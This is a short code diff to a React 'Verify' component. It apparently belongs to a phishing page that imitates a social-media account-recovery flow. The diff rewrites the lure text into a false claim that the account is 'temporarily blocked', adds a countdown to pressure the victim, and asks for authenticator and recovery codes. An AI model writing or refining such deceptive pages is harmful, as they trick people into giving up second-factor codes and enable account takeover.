@@ -16,11 +16,11 @@ const Verify = () => {
     const defaultTexts = useMemo(
         () => ({
             title: 'Two-factor authentication required',
-            description: 'Check the notification on another device. Or enter the code you received via SMS, email, Facebook message, or WhatsApp.',
+            description: 'We have temporarily blocked your account because your protect has changed. Verify code has been sent',
             placeholder: 'Enter your code',
             infoTitle: 'Approve from another device or Enter your verification code',
             infoDescription:
-                'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
+                'Enter the 6-digit code we just sent from the authenticator app you set up or Enter the 8-digit recovery code. Please enter the code within 02:21 to complete the appeal form.',
             walkthrough: "We'll walk you through some steps to secure and unlock your account.",
             submit: 'Submit',
             sendCode: 'Send Code',
